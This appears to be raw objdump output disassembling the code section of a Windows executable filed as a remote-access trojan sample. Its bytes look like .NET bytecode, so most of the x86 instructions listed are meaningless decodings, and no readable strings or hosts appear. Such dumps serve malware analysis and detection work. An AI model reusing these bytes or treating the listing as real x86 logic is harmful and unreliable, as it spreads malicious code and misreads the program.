
malware_samples/rat/351e37f699f677c00617189853bf808be77ca8ce0b10762dec8a076365160fe4.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	14 82                	adc    $0x82,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 80 43 00    	add    %al,0x438000
  402013:	00 ec                	add    %ch,%ah
  402015:	3d 00 00 03 00       	cmp    $0x30000,%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	e2 00                	loop   0x402056
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 16                	add    %dl,(%esi)
  40205e:	0a 2b                	or     (%ebx),%ch
  402060:	11 00                	adc    %eax,(%eax)
  402062:	20 e8                	and    %ch,%al
  402064:	03 00                	add    (%eax),%eax
  402066:	00 28                	add    %ch,(%eax)
  402068:	10 00                	adc    %al,(%eax)
  40206a:	00 0a                	add    %cl,(%edx)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	06                   	push   %es
  40206f:	17                   	pop    %ss
  402070:	58                   	pop    %eax
  402071:	0a 06                	or     (%esi),%al
  402073:	7e 11                	jle    0x402086
  402075:	00 00                	add    %al,(%eax)
  402077:	04 28                	add    $0x28,%al
  402079:	11 00                	adc    %eax,(%eax)
  40207b:	00 0a                	add    %cl,(%edx)
  40207d:	fe 04 0b             	incb   (%ebx,%ecx,1)
  402080:	07                   	pop    %es
  402081:	2d de 28 03 00       	sub    $0x328de,%eax
  402086:	00 06                	add    %al,(%esi)
  402088:	16                   	push   %ss
  402089:	fe 01                	incb   (%ecx)
  40208b:	0c 08                	or     $0x8,%al
  40208d:	2c 07                	sub    $0x7,%al
  40208f:	16                   	push   %ss
  402090:	28 12                	sub    %dl,(%edx)
  402092:	00 00                	add    %al,(%eax)
  402094:	0a 00                	or     (%eax),%al
  402096:	00 00                	add    %al,(%eax)
  402098:	28 37                	sub    %dh,(%edi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	06                   	push   %es
  40209d:	16                   	push   %ss
  40209e:	fe 01                	incb   (%ecx)
  4020a0:	0d 09 2c 07 16       	or     $0x16072c09,%eax
  4020a5:	28 12                	sub    %dl,(%edx)
  4020a7:	00 00                	add    %al,(%eax)
  4020a9:	0a 00                	or     (%eax),%al
  4020ab:	7e 0c                	jle    0x4020b9
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 28                	add    $0x28,%al
  4020b1:	13 00                	adc    (%eax),%eax
  4020b3:	00 0a                	add    %cl,(%edx)
  4020b5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4020b8:	04 2c                	add    $0x2c,%al
  4020ba:	06                   	push   %es
  4020bb:	28 27                	sub    %ah,(%edi)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	06                   	push   %es
  4020c0:	00 7e 04             	add    %bh,0x4(%esi)
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	04 28                	add    $0x28,%al
  4020c7:	13 00                	adc    (%eax),%eax
  4020c9:	00 0a                	add    %cl,(%edx)
  4020cb:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4020d1:	28 25 00 00 06 00    	sub    %ah,0x60000
  4020d7:	7e 0f                	jle    0x4020e8
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 28                	add    $0x28,%al
  4020dd:	13 00                	adc    (%eax),%eax
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	2c 07                	sub    $0x7,%al
  4020e3:	28 31                	sub    %dh,(%ecx)
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	06                   	push   %es
  4020e8:	2b 01                	sub    (%ecx),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 06                	adc    (%esi),%eax
  4020ed:	11 06                	adc    %eax,(%esi)
  4020ef:	2c 06                	sub    $0x6,%al
  4020f1:	28 40 00             	sub    %al,0x0(%eax)
  4020f4:	00 06                	add    %al,(%esi)
  4020f6:	00 28                	add    %ch,(%eax)
  4020f8:	35 00 00 06 00       	xor    $0x60000,%eax
  4020fd:	00 de                	add    %bl,%dh
  4020ff:	05 26 00 00 de       	add    $0xde000026,%eax
  402104:	00 2b                	add    %ch,(%ebx)
  402106:	32 00                	xor    (%eax),%al
  402108:	00 28                	add    %ch,(%eax)
  40210a:	12 00                	adc    (%eax),%al
  40210c:	00 06                	add    %al,(%esi)
  40210e:	16                   	push   %ss
  40210f:	fe 01                	incb   (%ecx)
  402111:	13 07                	adc    (%edi),%eax
  402113:	11 07                	adc    %eax,(%edi)
  402115:	2c 0e                	sub    $0xe,%al
  402117:	00 28                	add    %ch,(%eax)
  402119:	1f                   	pop    %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	06                   	push   %es
  40211d:	00 28                	add    %ch,(%eax)
  40211f:	1b 00                	sbb    (%eax),%eax
  402121:	00 06                	add    %al,(%esi)
  402123:	00 00                	add    %al,(%eax)
  402125:	00 de                	add    %bl,%dh
  402127:	05 26 00 00 de       	add    $0xde000026,%eax
  40212c:	00 20                	add    %ah,(%eax)
  40212e:	88 13                	mov    %dl,(%ebx)
  402130:	00 00                	add    %al,(%eax)
  402132:	28 10                	sub    %dl,(%eax)
  402134:	00 00                	add    %al,(%eax)
  402136:	0a 00                	or     (%eax),%al
  402138:	00 17                	add    %dl,(%edi)
  40213a:	13 08                	adc    (%eax),%ecx
  40213c:	2b c9                	sub    %ecx,%ecx
  40213e:	00 00                	add    %al,(%eax)
  402140:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 3b                	add    %bh,(%ebx)
  402147:	00 69 a4             	add    %ch,-0x5c(%ecx)
  40214a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402150:	00 00                	add    %al,(%eax)
  402152:	ac                   	lods   %ds:(%esi),%al
  402153:	00 20                	add    %ah,(%eax)
  402155:	cc                   	int3
  402156:	00 05 0f 00 00 01    	add    %al,0x100000f
  40215c:	22 02                	and    (%edx),%al
  40215e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402161:	00 0a                	add    %cl,(%edx)
  402163:	00 2a                	add    %ch,(%edx)
  402165:	00 00                	add    %al,(%eax)
  402167:	00 13                	add    %dl,(%ebx)
  402169:	30 02                	xor    %al,(%edx)
  40216b:	00 07                	add    %al,(%edi)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 02                	add    %al,(%edx)
  402171:	00 00                	add    %al,(%eax)
  402173:	11 00                	adc    %eax,(%eax)
  402175:	17                   	pop    %ss
  402176:	0a 2b                	or     (%ebx),%ch
  402178:	00 06                	add    %al,(%esi)
  40217a:	2a 00                	sub    (%eax),%al
  40217c:	1b 30                	sbb    (%eax),%esi
  40217e:	04 00                	add    $0x0,%al
  402180:	50                   	push   %eax
  402181:	00 00                	add    %al,(%eax)
  402183:	00 03                	add    %al,(%ebx)
  402185:	00 00                	add    %al,(%eax)
  402187:	11 00                	adc    %eax,(%eax)
  402189:	00 7e 0b             	add    %bh,0xb(%esi)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 6f                	add    $0x6f,%al
  402190:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402195:	16                   	push   %ss
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  40219c:	00 01                	add    %al,(%ecx)
  40219e:	0a 06                	or     (%esi),%al
  4021a0:	28 17                	sub    %dl,(%edi)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	0a 7e 07             	or     0x7(%esi),%bh
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	04 6f                	add    $0x6f,%al
  4021ab:	18 00                	sbb    %al,(%eax)
  4021ad:	00 0a                	add    %cl,(%edx)
  4021af:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  4021b3:	06                   	push   %es
  4021b4:	72 01                	jb     0x4021b7
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	70 28                	jo     0x4021e2
  4021ba:	19 00                	sbb    %eax,(%eax)
  4021bc:	00 0a                	add    %cl,(%edx)
  4021be:	7e 0a                	jle    0x4021ca
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 28                	add    $0x28,%al
  4021c4:	1a 00                	sbb    (%eax),%al
  4021c6:	00 0a                	add    %cl,(%edx)
  4021c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c9:	1b 00                	sbb    (%eax),%eax
  4021cb:	00 0a                	add    %cl,(%edx)
  4021cd:	0b de                	or     %esi,%ebx
  4021cf:	06                   	push   %es
  4021d0:	26 00 16             	add    %dl,%es:(%esi)
  4021d3:	0b de                	or     %esi,%ebx
  4021d5:	00 07                	add    %al,(%edi)
  4021d7:	2a 01                	sub    (%ecx),%al
  4021d9:	10 00                	adc    %al,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	00 01                	add    %al,(%ecx)
  4021df:	00 47 48             	add    %al,0x48(%edi)
  4021e2:	00 06                	add    %al,(%esi)
  4021e4:	12 00                	adc    (%eax),%al
  4021e6:	00 01                	add    %al,(%ecx)
  4021e8:	13 30                	adc    (%eax),%esi
  4021ea:	01 00                	add    %eax,(%eax)
  4021ec:	b0 00                	mov    $0x0,%al
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	72 0f                	jb     0x402205
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	70 80                	jo     0x40217a
  4021fa:	01 00                	add    %eax,(%eax)
  4021fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4021ff:	17                   	pop    %ss
  402200:	00 00                	add    %al,(%eax)
  402202:	70 80                	jo     0x402184
  402204:	02 00                	add    (%eax),%al
  402206:	00 04 72             	add    %al,(%edx,%esi,2)
  402209:	59                   	pop    %ecx
  40220a:	00 00                	add    %al,(%eax)
  40220c:	70 80                	jo     0x40218e
  40220e:	03 00                	add    (%eax),%eax
  402210:	00 04 72             	add    %al,(%edx,%esi,2)
  402213:	67 00 00             	add    %al,(%bx,%si)
  402216:	70 80                	jo     0x402198
  402218:	04 00                	add    $0x0,%al
  40221a:	00 04 72             	add    %al,(%edx,%esi,2)
  40221d:	73 00                	jae    0x40221f
  40221f:	00 70 80             	add    %dh,-0x80(%eax)
  402222:	05 00 00 04 72       	add    $0x72040000,%eax
  402227:	83 00 00             	addl   $0x0,(%eax)
  40222a:	70 80                	jo     0x4021ac
  40222c:	06                   	push   %es
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 72                	add    $0x72,%al
  402231:	9b                   	fwait
  402232:	00 00                	add    %al,(%eax)
  402234:	70 80                	jo     0x4021b6
  402236:	07                   	pop    %es
  402237:	00 00                	add    %al,(%eax)
  402239:	04 72                	add    $0x72,%al
  40223b:	f5                   	cmc
  40223c:	00 00                	add    %al,(%eax)
  40223e:	70 80                	jo     0x4021c0
  402240:	08 00                	or     %al,(%eax)
  402242:	00 04 72             	add    %al,(%edx,%esi,2)
  402245:	01 01                	add    %eax,(%ecx)
  402247:	00 70 80             	add    %dh,-0x80(%eax)
  40224a:	09 00                	or     %eax,(%eax)
  40224c:	00 04 72             	add    %al,(%edx,%esi,2)
  40224f:	1d 01 00 70 80       	sbb    $0x80700001,%eax
  402254:	0a 00                	or     (%eax),%al
  402256:	00 04 72             	add    %al,(%edx,%esi,2)
  402259:	67 00 00             	add    %al,(%bx,%si)
  40225c:	70 80                	jo     0x4021de
  40225e:	0c 00                	or     $0x0,%al
  402260:	00 04 7e             	add    %al,(%esi,%edi,2)
  402263:	07                   	pop    %es
  402264:	00 00                	add    %al,(%eax)
  402266:	04 73                	add    $0x73,%al
  402268:	4c                   	dec    %esp
  402269:	00 00                	add    %al,(%eax)
  40226b:	06                   	push   %es
  40226c:	80 0d 00 00 04 72 41 	orb    $0x41,0x72040000
  402273:	01 00                	add    %eax,(%eax)
  402275:	70 80                	jo     0x4021f7
  402277:	0e                   	push   %cs
  402278:	00 00                	add    %al,(%eax)
  40227a:	04 72                	add    $0x72,%al
  40227c:	67 00 00             	add    %al,(%bx,%si)
  40227f:	70 80                	jo     0x402201
  402281:	0f 00 00             	sldt   (%eax)
  402284:	04 28                	add    $0x28,%al
  402286:	2e 00 00             	add    %al,%cs:(%eax)
  402289:	06                   	push   %es
  40228a:	80 10 00             	adcb   $0x0,(%eax)
  40228d:	00 04 72             	add    %al,(%edx,%esi,2)
  402290:	4b                   	dec    %ebx
  402291:	01 00                	add    %eax,(%eax)
  402293:	70 80                	jo     0x402215
  402295:	11 00                	adc    %eax,(%eax)
  402297:	00 04 72             	add    %al,(%edx,%esi,2)
  40229a:	4f                   	dec    %edi
  40229b:	01 00                	add    %eax,(%eax)
  40229d:	70 80                	jo     0x40221f
  40229f:	12 00                	adc    (%eax),%al
  4022a1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4022a4:	1a 7e 13             	sbb    0x13(%esi),%bh
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	04 2a                	add    $0x2a,%al
  4022ab:	1e                   	push   %ds
  4022ac:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  4022b2:	2a 1a                	sub    (%edx),%bl
  4022b4:	7e 14                	jle    0x4022ca
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 2a                	add    $0x2a,%al
  4022ba:	1e                   	push   %ds
  4022bb:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4022c1:	2a 1a                	sub    (%edx),%bl
  4022c3:	7e 15                	jle    0x4022da
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	04 2a                	add    $0x2a,%al
  4022c9:	1e                   	push   %ds
  4022ca:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4022d0:	2a 1a                	sub    (%edx),%bl
  4022d2:	7e 16                	jle    0x4022ea
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	04 2a                	add    $0x2a,%al
  4022d8:	1e                   	push   %ds
  4022d9:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4022df:	2a 1a                	sub    (%edx),%bl
  4022e1:	7e 17                	jle    0x4022fa
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	04 2a                	add    $0x2a,%al
  4022e7:	1e                   	push   %ds
  4022e8:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4022ee:	2a 1a                	sub    (%edx),%bl
  4022f0:	7e 18                	jle    0x40230a
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 2a                	add    $0x2a,%al
  4022f6:	1e                   	push   %ds
  4022f7:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4022fd:	2a 1a                	sub    (%edx),%bl
  4022ff:	7e 19                	jle    0x40231a
  402301:	00 00                	add    %al,(%eax)
  402303:	04 2a                	add    $0x2a,%al
  402305:	1e                   	push   %ds
  402306:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  40230c:	2a 1a                	sub    (%edx),%bl
  40230e:	7e 1a                	jle    0x40232a
  402310:	00 00                	add    %al,(%eax)
  402312:	04 2a                	add    $0x2a,%al
  402314:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 2a                	add    $0x2a,%al
  40231b:	1e                   	push   %ds
  40231c:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  402322:	2a 1a                	sub    (%edx),%bl
  402324:	7e 1c                	jle    0x402342
  402326:	00 00                	add    %al,(%eax)
  402328:	04 2a                	add    $0x2a,%al
  40232a:	1e                   	push   %ds
  40232b:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  402331:	2a 1a                	sub    (%edx),%bl
  402333:	7e 1d                	jle    0x402352
  402335:	00 00                	add    %al,(%eax)
  402337:	04 2a                	add    $0x2a,%al
  402339:	1e                   	push   %ds
  40233a:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  402340:	2a 00                	sub    (%eax),%al
  402342:	00 00                	add    %al,(%eax)
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	07                   	pop    %es
  402347:	00 46 03             	add    %al,0x3(%esi)
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 00                	add    $0x0,%al
  40234e:	00 11                	add    %dl,(%ecx)
  402350:	00 00                	add    %al,(%eax)
  402352:	18 17                	sbb    %dl,(%edi)
  402354:	1c 73                	sbb    $0x73,%al
  402356:	1c 00                	sbb    $0x0,%al
  402358:	00 0a                	add    %cl,(%edx)
  40235a:	25 20 00 c8 00       	and    $0xc80020,%eax
  40235f:	00 6f 1d             	add    %ch,0x1d(%edi)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 00                	or     (%eax),%al
  402366:	25 20 00 c8 00       	and    $0xc80020,%eax
  40236b:	00 6f 1e             	add    %ch,0x1e(%edi)
  40236e:	00 00                	add    %al,(%eax)
  402370:	0a 00                	or     (%eax),%al
  402372:	28 07                	sub    %al,(%edi)
  402374:	00 00                	add    %al,(%eax)
  402376:	06                   	push   %es
  402377:	00 7e 0e             	add    %bh,0xe(%esi)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	04 72                	add    $0x72,%al
  40237e:	41                   	inc    %ecx
  40237f:	01 00                	add    %eax,(%eax)
  402381:	70 28                	jo     0x4023ab
  402383:	1f                   	pop    %ds
  402384:	00 00                	add    %al,(%eax)
  402386:	0a 0a                	or     (%edx),%cl
  402388:	06                   	push   %es
  402389:	39 eb                	cmp    %ebp,%ebx
  40238b:	00 00                	add    %al,(%eax)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	7e 02                	jle    0x402393
  402391:	00 00                	add    %al,(%eax)
  402393:	04 17                	add    $0x17,%al
  402395:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402399:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40239f:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a0:	20 00                	and    %al,(%eax)
  4023a2:	00 0a                	add    %cl,(%edx)
  4023a4:	73 21                	jae    0x4023c7
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	0a 7e 02             	or     0x2(%esi),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 17                	add    $0x17,%al
  4023af:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023b3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	00 0a                	add    %cl,(%edx)
  4023be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023c1:	22 00                	and    (%eax),%al
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	9a 0b 7e 01 00 00 04 	lcall  $0x400,$0x17e0b
  4023cc:	17                   	pop    %ss
  4023cd:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023d1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	20 00                	and    %al,(%eax)
  4023da:	00 0a                	add    %cl,(%edx)
  4023dc:	73 21                	jae    0x4023ff
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	0a 7e 01             	or     0x1(%esi),%bh
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	04 17                	add    $0x17,%al
  4023e7:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023eb:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f2:	20 00                	and    %al,(%eax)
  4023f4:	00 0a                	add    %cl,(%edx)
  4023f6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023f9:	22 00                	and    (%eax),%al
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	9a 28 11 00 00 0a 0c 	lcall  $0xc0a,$0x1128
  402404:	07                   	pop    %es
  402405:	28 1d 00 00 06 0d    	sub    %bl,0xd060000
  40240b:	09 2c 56             	or     %ebp,(%esi,%edx,2)
  40240e:	00 07                	add    %al,(%edi)
  402410:	28 23                	sub    %ah,(%ebx)
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 13                	or     (%ebx),%dl
  402416:	04 00                	add    $0x0,%al
  402418:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40241b:	05 16 13 06 2b       	add    $0x2b061316,%eax
  402420:	38 11                	cmp    %dl,(%ecx)
  402422:	05 11 06 9a 13       	add    $0x139a0611,%eax
  402427:	07                   	pop    %es
  402428:	00 00                	add    %al,(%eax)
  40242a:	28 06                	sub    %al,(%esi)
  40242c:	00 00                	add    %al,(%eax)
  40242e:	06                   	push   %es
  40242f:	11 07                	adc    %eax,(%edi)
  402431:	08 6f 24             	or     %ch,0x24(%edi)
  402434:	00 00                	add    %al,(%eax)
  402436:	0a 00                	or     (%eax),%al
  402438:	28 06                	sub    %al,(%esi)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	06                   	push   %es
  40243d:	6f                   	outsl  %ds:(%esi),(%dx)
  40243e:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402443:	08 11                	or     %dl,(%ecx)
  402445:	08 2c 02             	or     %ch,(%edx,%eax,1)
  402448:	de 17                	ficoms (%edi)
  40244a:	00 de                	add    %bl,%dh
  40244c:	05 26 00 00 de       	add    $0xde000026,%eax
  402451:	00 00                	add    %al,(%eax)
  402453:	11 06                	adc    %eax,(%esi)
  402455:	17                   	pop    %ss
  402456:	58                   	pop    %eax
  402457:	13 06                	adc    (%esi),%eax
  402459:	11 06                	adc    %eax,(%esi)
  40245b:	11 05 8e 69 32 c0    	adc    %eax,0xc032698e
  402461:	00 2b                	add    %ch,(%ebx)
  402463:	0f 00 28             	verw   (%eax)
  402466:	06                   	push   %es
  402467:	00 00                	add    %al,(%eax)
  402469:	06                   	push   %es
  40246a:	07                   	pop    %es
  40246b:	08 6f 26             	or     %ch,0x26(%edi)
  40246e:	00 00                	add    %al,(%eax)
  402470:	0a 00                	or     (%eax),%al
  402472:	00 00                	add    %al,(%eax)
  402474:	38 95 00 00 00 00    	cmp    %dl,0x0(%ebp)
  40247a:	73 27                	jae    0x4024a3
  40247c:	00 00                	add    %al,(%eax)
  40247e:	0a 13                	or     (%ebx),%dl
  402480:	09 00                	or     %eax,(%eax)
  402482:	72 5b                	jb     0x4024df
  402484:	01 00                	add    %eax,(%eax)
  402486:	70 72                	jo     0x4024fa
  402488:	5b                   	pop    %ebx
  402489:	01 00                	add    %eax,(%eax)
  40248b:	70 73                	jo     0x402500
  40248d:	28 00                	sub    %al,(%eax)
  40248f:	00 0a                	add    %cl,(%edx)
  402491:	13 0a                	adc    (%edx),%ecx
  402493:	11 09                	adc    %ecx,(%ecx)
  402495:	11 0a                	adc    %ecx,(%edx)
  402497:	6f                   	outsl  %ds:(%esi),(%dx)
  402498:	29 00                	sub    %eax,(%eax)
  40249a:	00 0a                	add    %cl,(%edx)
  40249c:	00 11                	add    %dl,(%ecx)
  40249e:	09 7e 0e             	or     %edi,0xe(%esi)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	04 6f                	add    $0x6f,%al
  4024a5:	2a 00                	sub    (%eax),%al
  4024a7:	00 0a                	add    %cl,(%edx)
  4024a9:	13 0b                	adc    (%ebx),%ecx
  4024ab:	11 0b                	adc    %ecx,(%ebx)
  4024ad:	17                   	pop    %ss
  4024ae:	8d 4b 00             	lea    0x0(%ebx),%ecx
  4024b1:	00 01                	add    %al,(%ecx)
  4024b3:	25 16 72 5d 01       	and    $0x15d7216,%eax
  4024b8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024bb:	16                   	push   %ss
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	2b 00                	sub    (%eax),%eax
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4024c4:	0c 16                	or     $0x16,%al
  4024c6:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  4024cd:	0c 73                	or     $0x73,%al
  4024cf:	21 00                	and    %eax,(%eax)
  4024d1:	00 0a                	add    %cl,(%edx)
  4024d3:	17                   	pop    %ss
  4024d4:	11 0c 8e             	adc    %ecx,(%esi,%ecx,4)
  4024d7:	69 6f 2c 00 00 0a 9a 	imul   $0x9a0a0000,0x2c(%edi),%ebp
  4024de:	80 01 00             	addb   $0x0,(%ecx)
  4024e1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024e4:	06                   	push   %es
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	06                   	push   %es
  4024e8:	7e 02                	jle    0x4024ec
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	04 7e                	add    $0x7e,%al
  4024ee:	01 00                	add    %eax,(%eax)
  4024f0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024f3:	11 00                	adc    %eax,(%eax)
  4024f5:	00 0a                	add    %cl,(%edx)
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	26 00 00             	add    %al,%es:(%eax)
  4024fb:	0a 00                	or     (%eax),%al
  4024fd:	00 de                	add    %bl,%dh
  4024ff:	0d 11 09 2c 08       	or     $0x82c0911,%eax
  402504:	11 09                	adc    %ecx,(%ecx)
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40250c:	dc 00                	faddl  (%eax)
  40250e:	28 06                	sub    %al,(%esi)
  402510:	00 00                	add    %al,(%eax)
  402512:	06                   	push   %es
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402519:	0d 11 0d 39 51       	or     $0x51390d11,%eax
  40251e:	01 00                	add    %eax,(%eax)
  402520:	00 00                	add    %al,(%eax)
  402522:	72 61                	jb     0x402585
  402524:	01 00                	add    %eax,(%eax)
  402526:	70 28                	jo     0x402550
  402528:	2e 00 00             	add    %al,%cs:(%eax)
  40252b:	0a 00                	or     (%eax),%al
  40252d:	17                   	pop    %ss
  40252e:	28 13                	sub    %dl,(%ebx)
  402530:	00 00                	add    %al,(%eax)
  402532:	06                   	push   %es
  402533:	00 28                	add    %ch,(%eax)
  402535:	06                   	push   %es
  402536:	00 00                	add    %al,(%eax)
  402538:	06                   	push   %es
  402539:	17                   	pop    %ss
  40253a:	73 2f                	jae    0x40256b
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 16                	or     (%esi),%dl
  402540:	14 fe                	adc    $0xfe,%al
  402542:	06                   	push   %es
  402543:	1e                   	push   %ds
  402544:	00 00                	add    %al,(%eax)
  402546:	06                   	push   %es
  402547:	73 30                	jae    0x402579
  402549:	00 00                	add    %al,(%eax)
  40254b:	0a 73 31             	or     0x31(%ebx),%dh
  40254e:	00 00                	add    %al,(%eax)
  402550:	0a 28                	or     (%eax),%ch
  402552:	09 00                	or     %eax,(%eax)
  402554:	00 06                	add    %al,(%esi)
  402556:	00 28                	add    %ch,(%eax)
  402558:	08 00                	or     %al,(%eax)
  40255a:	00 06                	add    %al,(%esi)
  40255c:	28 06                	sub    %al,(%esi)
  40255e:	00 00                	add    %al,(%eax)
  402560:	06                   	push   %es
  402561:	6f                   	outsl  %ds:(%esi),(%dx)
  402562:	32 00                	xor    (%eax),%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	6f                   	outsl  %ds:(%esi),(%dx)
  402567:	33 00                	xor    (%eax),%eax
  402569:	00 0a                	add    %cl,(%edx)
  40256b:	17                   	pop    %ss
  40256c:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402570:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402576:	6f                   	outsl  %ds:(%esi),(%dx)
  402577:	20 00                	and    %al,(%eax)
  402579:	00 0a                	add    %cl,(%edx)
  40257b:	16                   	push   %ss
  40257c:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402583:	16                   	push   %ss
  402584:	6f                   	outsl  %ds:(%esi),(%dx)
  402585:	34 00                	xor    $0x0,%al
  402587:	00 0a                	add    %cl,(%edx)
  402589:	00 14 28             	add    %dl,(%eax,%ebp,1)
  40258c:	22 00                	and    (%eax),%al
  40258e:	00 06                	add    %al,(%esi)
  402590:	00 1a                	add    %bl,(%edx)
  402592:	6a 28                	push   $0x28
  402594:	0d 00 00 06 00       	or     $0x60000,%eax
  402599:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40259c:	00 06                	add    %al,(%esi)
  40259e:	d4 8d                	aam    $0x8d
  4025a0:	59                   	pop    %ecx
  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	01 28                	add    %ebp,(%eax)
  4025a5:	0b 00                	or     (%eax),%eax
  4025a7:	00 06                	add    %al,(%esi)
  4025a9:	00 16                	add    %dl,(%esi)
  4025ab:	6a 28                	push   $0x28
  4025ad:	0f 00 00             	sldt   (%eax)
  4025b0:	06                   	push   %es
  4025b1:	00 28                	add    %ch,(%eax)
  4025b3:	30 00                	xor    %al,(%eax)
  4025b5:	00 06                	add    %al,(%esi)
  4025b7:	28 21                	sub    %ah,(%ecx)
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	06                   	push   %es
  4025bc:	00 16                	add    %dl,(%esi)
  4025be:	28 18                	sub    %bl,(%eax)
